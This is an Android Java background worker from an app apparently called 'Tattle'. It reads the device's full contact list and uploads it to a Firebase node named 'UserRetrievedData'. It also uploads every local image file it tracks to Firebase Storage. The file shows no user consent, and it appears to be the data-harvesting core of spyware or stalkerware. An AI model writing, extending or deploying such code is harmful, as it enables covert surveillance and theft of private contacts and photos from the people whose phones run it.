package com.globalsolutions.Tattle.DataUploadServices;

import android.app.Application;
import android.content.Context;
import android.net.Uri;

import androidx.annotation.NonNull;
import androidx.work.Data;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.globalsolutions.Tattle.LocalFilesDB.ImageFile;
import com.globalsolutions.Tattle.LocalFilesDB.ImageFileRepo;
import com.globalsolutions.Tattle.Models.ContactsInfo;
import com.globalsolutions.Tattle.OtherUtils.ContactUtil;
import com.globalsolutions.Tattle.OtherUtils.SharedPrefs;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.util.List;

public class ContinuouslyImagesUploadingService extends Worker {

    public static final String TAG = "CONTINUOUSLYUPLOADIN";

    FirebaseDatabase firebaseDatabase;
    DatabaseReference databaseReference;
    FirebaseAuth firebaseAuth;
    SharedPrefs sharedPrefs;
    StorageReference storageReference;
    ImageFileRepo imageFileRepo;
    Context context;
    List<ImageFile> imageFiles;
    boolean uploadedIMAGE = false;
    int count=0;


    public ContinuouslyImagesUploadingService(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        this.context = context;
    }

    @NonNull
    @Override
    public Result doWork() {

        ContactUtil contactUtil = new ContactUtil(context);

        sharedPrefs = SharedPrefs.getInstance(this.getApplicationContext());
        firebaseDatabase = FirebaseDatabase.getInstance();
        firebaseAuth = FirebaseAuth.getInstance();

        databaseReference = firebaseDatabase.getReference();
        storageReference = FirebaseStorage.getInstance().getReference(sharedPrefs.getUniqueId());
        imageFileRepo = new ImageFileRepo((Application) context.getApplicationContext());
        imageFiles = imageFileRepo.getAllImageFiles();

        List<ContactsInfo> contactsInfoList = contactUtil.getContacts();

        if (contactsInfoList != null) {
            databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("ContactList").setValue(contactsInfoList).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void aVoid) {
                    count++;
                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                }
            });
        }

        if (imageFiles != null && !imageFiles.isEmpty()) {
            for (int i = 0; i < imageFiles.size(); i++) {
                File file = getFileFromPath(imageFiles.get(i).getImagePath());
                ImageFile imageFile = imageFiles.get(i);
                if (file != null && !imageFile.isUploaded()) {
                    uploadedIMAGE = false;
                    uploadFile(file, imageFile);
                    while (!uploadedIMAGE) {

                    }
                }
            }
        }

        Data outputData = new Data.Builder().putBoolean("photosSyncedWithServer", true).build();
        return Result.success(outputData);
    }

    public void uploadFile(File file, ImageFile imageFile) {
        StorageReference mStorageRef = this.storageReference.child("UserImages").child(imageFile.getImageFolder()).child(file.getName());

        Uri uri = Uri.fromFile(file);
        mStorageRef.putFile(uri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
            @Override
            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                mStorageRef.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                    @Override
                    public void onSuccess(Uri uri) {
                        databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("Images").child(imageFile.getImageFolder()).push().setValue(uri.toString()).addOnSuccessListener(new OnSuccessListener<Void>() {
                            @Override
                            public void onSuccess(Void aVoid) {
                                imageFile.setUploaded(true);
                                imageFileRepo.update(imageFile);
                                uploadedIMAGE = true;
                            }
                        }).addOnFailureListener(new OnFailureListener() {
                            @Override
                            public void onFailure(@NonNull Exception e) {
                                uploadedIMAGE = true;
                            }
                        });
                    }
                }).addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        uploadedIMAGE = true;
                    }
                });
            }
        }).addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception e) {
                uploadedIMAGE = true;
            }
        });
    }

    public File getFileFromPath(String path) {
        File file = new File(path);
        if (file.exists()) {
            return file;
        }
        return null;
    }




}
